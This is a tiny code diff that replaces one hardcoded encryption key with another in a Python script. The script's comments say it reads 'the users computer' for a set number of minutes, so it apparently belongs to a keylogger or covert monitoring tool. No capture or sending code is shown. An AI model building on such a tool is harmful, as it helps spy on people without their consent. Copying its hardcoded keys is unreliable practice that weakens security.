@@ -113,7 +113,7 @@ def main():
     minutes = 1
 
     # key for encrypting, key is given through the key generator file
-    key = "7LBG7bqMkRqedGjS3h717rgono_TlKbRaxZVBzGCZXM="
+    key = "euEiwy6QMfruKOztxRz9CUEHqyYU_qdw74Ot9mJZ6FM="
 
     # will continue to read the users computer for specified minutes
     while countMin < minutes:
